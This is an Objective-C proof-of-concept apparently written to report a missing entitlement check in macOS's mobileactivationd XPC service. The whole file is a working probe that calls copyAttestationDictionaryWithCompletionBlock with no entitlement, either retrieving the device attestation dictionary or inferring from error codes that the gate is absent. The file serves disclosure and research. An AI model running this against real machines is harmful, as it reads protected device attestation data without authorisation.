/*
 * PoC: Ungated copyAttestationDictionaryWithCompletionBlock on macOS mobileactivationd.
 *
 * Build:  clang -framework Foundation -fobjc-arc poc.m -o poc
 * Run:    ./poc  (no entitlement or codesigning required)
 *
 * Expected (secure): error with description "missing entitlement" or connection refused
 * Actual (vulnerable): method executes; returns attestation dict on T2/Apple Silicon,
 *                      or error -1 (not -3) on pre-T2 Intel confirming gate is absent.
 */

#import <Foundation/Foundation.h>

/* Confirm three gated methods return a different error code than the ungated method. */
static void probe_gated(id proxy, dispatch_semaphore_t sem, int *gated_code) {
    [(id)proxy getActivationState:nil completion:^(NSDictionary *r, NSError *e) {
        *gated_code = (int)e.code;
        NSLog(@"[CONTROL gated   ] getActivationState  -> code %ld (%@)", e.code, e.localizedDescription);
        dispatch_semaphore_signal(sem);
    }];
}

int main(void) { @autoreleasepool {
    NSXPCConnection *c = [[NSXPCConnection alloc]
        initWithMachServiceName:@"com.apple.mobileactivationd"
                        options:0];

    Protocol *p = NSProtocolFromString(@"MobileActivationMacOSProtocol");
    if (!p) {
        NSLog(@"ABORT: MobileActivationMacOSProtocol not found -- wrong macOS version");
        return 2;
    }
    c.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:p];
    [c resume];

    id proxy = c.remoteObjectProxy;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    __block int ungated_code  = 0;
    __block int gated_code    = 0;
    __block NSDictionary *attestation_dict = nil;
    __block int calls_done = 0;

    NSDictionary *opts = @{
        @"OIDSToInclude": @[@"1.2.840.113635.100.6.96"],
        @"RKAttestationPublicKey": [@"PoC" dataUsingEncoding:NSUTF8StringEncoding],
    };

    /* Probe ungated method */
    [(id)proxy copyAttestationDictionaryWithCompletionBlock:nil
                                                    options:opts
                                                 completion:^(NSDictionary *result, NSError *err) {
        if (result) {
            attestation_dict = result;
            NSLog(@"[UNGATED] Attestation dict received (%lu keys):", result.count);
            for (NSString *key in result)
                NSLog(@"  %@: %@", key, [result[key] class]);
        } else {
            ungated_code = (int)err.code;
            NSLog(@"[UNGATED] copyAttestationDictionary -> code %ld (%@)",
                  err.code, err.localizedDescription);
        }
        if (++calls_done == 2) dispatch_semaphore_signal(sem);
    }];

    /* Probe gated method for comparison */
    [(id)proxy getActivationState:nil completion:^(NSDictionary *r, NSError *e) {
        gated_code = (int)e.code;
        NSLog(@"[GATED  ] getActivationState        -> code %ld (%@)",
              e.code, e.localizedDescription);
        if (++calls_done == 2) dispatch_semaphore_signal(sem);
    }];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10LL * NSEC_PER_SEC));
    [c invalidate];

    NSLog(@"");
    if (attestation_dict) {
        NSLog(@"FINDING CONFIRMED (T2/Apple Silicon): received attestation dict without entitlement");
        return 0;
    }

    /*
     * On pre-T2 Intel, hardware-support check fires before the entitlement check on
     * ALL methods, so every method returns -3 "Not supported on this device".
     * The ungated method, having no entitlement check, reaches deeper logic and returns
     * a different code (-1 "Invalid input(s)") on pre-T2 Intel.
     * Identical error codes mean the test is inconclusive on this hardware.
     */
    if (ungated_code != 0 && gated_code != 0 && ungated_code != gated_code) {
        NSLog(@"FINDING CONFIRMED (pre-T2 Intel): ungated method returned different error code");
        NSLog(@"  ungated copyAttestationDictionary: code %d", ungated_code);
        NSLog(@"  gated   getActivationState:        code %d", gated_code);
        NSLog(@"  Difference proves entitlement gate is absent for copyAttestationDictionary.");
        NSLog(@"  Run on T2 or Apple Silicon for full attestation dict retrieval.");
        return 0;
    }

    NSLog(@"NOT CONFIRMED on this hardware/version -- both methods returned code %d", ungated_code);
    return 1;
}}
